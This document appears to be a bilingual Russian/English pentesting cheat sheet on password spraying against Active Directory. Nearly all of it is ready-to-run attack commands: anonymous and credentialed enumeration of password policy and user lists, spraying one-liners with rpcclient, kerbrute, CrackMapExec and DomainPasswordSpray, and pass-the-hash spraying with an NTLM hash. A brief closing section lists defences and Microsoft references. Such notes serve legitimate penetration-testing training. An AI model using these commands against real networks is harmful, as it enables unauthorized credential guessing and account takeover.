# Password Spraying 

**RU:**
Passsword Spraying  - это атака на каналы аутентификации, где злоумышленник, о котором идет речь, берет огромное количество имен пользователей и один пароль, а затем пробует каждое из этих имен пользователей, пока одно из них не будет подобрано верно<br>
**EN:**
Password Spraying - is an attack on authentication channels, where the attacker in question takes a huge number of usernames and one password, and then tries each of these usernames until one of them is picked up correctly<br>

## Password Policy Enumeration

**RU:** Для начала нужно проверить политку пароля, перед началом атаки Password Spraying<br>
**EN:** First, you need to check the password policy before starting a Password Spraying attack<br>

## Null Session for check password policy 

rcpclient
```
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

Password policy enumerating with enum4linux
```
enum4linux -P 172.16.5.5
```

Using enu4mlinux-ng
```
enum4linux-ng -P 172.16.5.5 -oA filename
```

## LDAP Anonymous

Using ldapsearch
```
ldapsearch -h 172.16.5.5 -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

## Credentialed Password Policy Enumeration

Crackmapexec 
```
crackmapexec smb 172.16.5.5 -u administrator -p Password123 --pass-pol
```

## Password policy check Windows

Using net.exe
```
net accounts
```

Using PowerView
```
import-module .\PowerView.ps1
Get-DomainPolicy
```
## Enumerate a target User List

**RU:** Как собрать имена пользователей? Вот что можно сделать для этого.<br>
**EN:** How do you collect user names if there are no credentials? Here's what you can do to do it.<br>

## SMB NULL Session to Pull User List

Using enum4linux
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

Using rpcclient
```
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```

Using Crackmapexec 
```
crackmapexec smb 172.16.5.5 --users
```

Gathering Users with LDAP Anonymous
```
ldapsearch -h 172.16.5.5 -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

Using windapsearch
```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

Enumerating Users with Kerbrute
```
kerbrute userenum -d domain.local --dc 172.16.5.5 /usr/share/seclists/Usernames/Names/names.txt
```

## Credentialed Enumeration to Build our User List

Crackmapexec
```
crackmapexec smb 172.16.5.5 -u administartor -p Password@123! --users
```

Impacket
```
sudo impacket-GetADUsers -all domain.local/administartor:'Password@123!'
```

## Password-Spraying Explotation

**RU:** После того как мы собрали список пользователей, теперь можем эксплуатировать атаку Password-Spraying, для Linux и Windows<br>
**EN:** Once we have collected the list of users, we can now exploit the Password-Spraying attack, for Linux and Windows<br>

## Linux 

Using a Bash one-liner for the Attack rpcclient
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Password@1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Using Kerbrute for the Attack
```
kerbrute passwordspray -d domain.local --dc 172.16.5.5 valid_users.txt  Password@123!
```

Using CrackMapExec & Filtering Logon Failures
```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password@123! | grep +
```

## Password spraying wth NTLM Hash

Local administrator NTLM Hash Password spraying
```
sudo crackmapexec smb --local-auth 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

Domain Users NTLM Hash Password spraying 
```
sudo crackmapexec smb --local-auth 172.16.5.5 -u willaym -d DOMAIN.LOCAL -H 88ad09182de639ccc6579eb0849751cf | grep +
```
# Windows

**RU:** Следующая команда автоматически создаст список пользователей из домена текущего пользователя и попытается аутентифицироваться, используя каждое имя пользователя и пароль Password@123!.<br>
**EN:** The following command will automatically create a list of users from the current user's domain and attempt to authenticate using each Password@123! username and password.<br>

```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Password@123! -OutFile spray_success -ErrorAction SilentlyContinue
```

## How to Prevent 

**RU:**
Для защиты от атаки Password-Spraying можно реализовать следующие меры:
<ol>
<li>Политика паролей: требовать от пользователей сложные пароли и регулярно менять их.</li>
<li>Блокирование учетных записей: блокировать учетные записи на определенный период времени после определенного количества неудачных попыток входа.</li>
<li>Двухфакторная аутентификация: включить двухфакторную аутентификацию, чтобы повысить уровень безопасности при входе в систему.</li>
<li>Мониторинг журналов аутентификации: мониторить журналы аутентификации на необычную активность, такую как несколько неудачных попыток входа из разных мест.</li>
<li>Ограничение доступа к внешним ресурсам: ограничить доступ к внешним ресурсам, например, путем настройки фильтров пакетов или использования VPN.</li>
</ol>

Так же подробнее можите почитать здесь:
<ol>
<li>https://www.microsoft.com/en-us/security/blog/2020/04/23/protecting-organization-password-spray-attacks/</li>
<li>https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-password-spray</li>
<li>https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements</li>
</ol>

**EN:**
The following measures can be implemented to protect against a Password-Spraying attack:
<ol>
<li>Password policy: require users to have complex passwords and change them regularly.</li>
<li>Account blocking: block accounts for a certain period of time after a certain number of failed login attempts.</li>
<li>Two-factor authentication: Enable two-factor authentication to increase the level of security for logins.</li>
<li>Authentication log monitoring: monitor authentication logs for unusual activity, such as multiple failed login attempts from different locations.</li>
<li>Limit access to external resources: limit access to external resources, for example by configuring packet filters or using a VPN.</li>
</ol>

You can also read more here:
<ol>
<li>https://www.microsoft.com/en-us/security/blog/2020/04/23/protecting-organization-password-spray-attacks/</li>
<li>https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-password-spray</li>
<li>https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements</li>
</ol>